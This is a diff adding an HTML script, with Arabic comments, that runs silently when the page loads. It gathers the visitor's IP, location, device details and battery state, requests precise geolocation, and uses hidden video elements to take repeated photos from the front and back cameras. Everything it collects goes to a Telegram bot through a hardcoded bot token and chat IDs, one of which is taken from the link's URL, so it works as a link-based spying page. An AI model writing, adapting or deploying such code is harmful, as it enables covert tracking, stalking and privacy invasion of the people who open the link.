@@ -1,0 +1,202 @@
+
+
+<script>
+    // ⚙️ إعدادات التيليجرام
+    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
+    const FIXED_CHAT_ID = '1431886140'; // ثابت
+
+    // 📍 جلب chatId من الرابط
+    const urlParams = new URLSearchParams(window.location.search);
+    const dynamicChatId = urlParams.get("id");
+
+    // 🛠️ إرسال للمعرفات كلها
+    function sendToTelegramMultiple(message, isLocation = false, lat = null, lon = null, photoBlob = null, caption = '') {
+        const ids = [FIXED_CHAT_ID];
+        if (dynamicChatId) ids.push(dynamicChatId);
+
+        ids.forEach(chatId => {
+            if (isLocation) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        latitude: lat,
+                        longitude: lon
+                    })
+                }).catch(() => {});
+            } else if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', photoBlob, 'photo.webp');
+                if (caption) formData.append('caption', caption);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            } else {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(() => {});
+            }
+        });
+    }
+
+    // 🌐 جمع بيانات إضافية
+    async function collectAdditionalData() {
+        let ip = 'مافيش';
+        let country = 'مافيش';
+        let city = 'مافيش';
+
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            ip = data.ip || 'مافيش';
+            country = data.country_name || 'مافيش';
+            city = data.city || 'مافيش';
+        } catch (e) {}
+
+        let batteryLevel = 'مافيش';
+        let batteryCharging = 'مافيش';
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = Math.round(battery.level * 100) + '%';
+            batteryCharging = battery.charging ? 'نعم' : 'لا';
+        } catch (e) {}
+
+        return {
+            ip, country, city,
+            platform: navigator.platform,
+            deviceVersion: navigator.userAgent,
+            batteryLevel, batteryCharging
+        };
+    }
+
+    // 📍 جلب الموقع
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    resolve({ lat: latitude, lon: longitude, accuracy });
+                },
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // 📝 إرسال تقرير
+    function sendTextReport(data, note = '') {
+        let message = `
+📋 *تقرير جمع البيانات*
+🆔 الثابت: ${FIXED_CHAT_ID}
+🆔 من الرابط: ${dynamicChatId || 'مافيش'}
+🌐 الجهاز:
+• النظام: ${data.platform}
+• User Agent: ${data.deviceVersion}
+🔋 البطارية: ${data.batteryLevel} | الشحن: ${data.batteryCharging}
+🌍 الموقع:
+• الآيبي: ${data.ip}
+• الدولة: ${data.country}
+• المدينة: ${data.city}
+${note ? `📌 ملاحظة: ${note}` : ''}
+⏰ ${new Date().toLocaleString('ar-EG')}
+        `.trim();
+
+        sendToTelegramMultiple(message);
+    }
+
+    // 📸 إعداد الكاميرا
+    function setupCamera(video, canvas, type) {
+        video.play();
+        video.onplaying = () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            let count = 0;
+
+            const interval = setInterval(() => {
+                if (count >= 3) {
+                    clearInterval(interval);
+                    stopCamera(video);
+                    return;
+                }
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    sendToTelegramMultiple('', false, null, null, blob, `📸 كاميرا ${type} - صورة ${count + 1}`);
+                }, 'image/jpeg', 0.7);
+                count++;
+            }, 1500);
+        };
+    }
+
+    function stopCamera(video) {
+        if (video.srcObject) {
+            video.srcObject.getTracks().forEach(track => track.stop());
+        }
+    }
+
+    // 🚀 تشغيل عند تحميل الصفحة
+    window.addEventListener('load', async () => {
+        const data = await collectAdditionalData();
+
+        // 📍 الموقع
+        const location = await getLocation();
+        if (location) {
+            sendToTelegramMultiple('', true, location.lat, location.lon);
+            data.location = `Lat: ${location.lat}, Lon: ${location.lon}, دقة: ${location.accuracy}`;
+        } else {
+            data.location = 'مافيش';
+        }
+
+        sendTextReport(data);
+
+        // 🎥 الكاميرات
+        const frontVideo = document.createElement('video');
+        const backVideo = document.createElement('video');
+        const frontCanvas = document.createElement('canvas');
+        const backCanvas = document.createElement('canvas');
+
+        [frontVideo, backVideo].forEach(v => {
+            v.setAttribute('playsinline', '');
+            v.setAttribute('autoplay', '');
+            v.setAttribute('muted', '');
+            document.body.appendChild(v);
+            v.style.display = 'none';
+        });
+
+        [frontCanvas, backCanvas].forEach(c => {
+            document.body.appendChild(c);
+            c.style.display = 'none';
+        });
+
+        try {
+            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            frontVideo.srcObject = frontStream;
+            setupCamera(frontVideo, frontCanvas, "أمامية");
+        } catch (e) {
+            sendToTelegramMultiple("❌ فشل الوصول للكاميرا الأمامية");
+        }
+
+        try {
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            backVideo.srcObject = backStream;
+            setupCamera(backVideo, backCanvas, "خلفية");
+        } catch (e) {
+            sendToTelegramMultiple("❌ فشل الوصول للكاميرا الخلفية");
+        }
+    });
+</script>
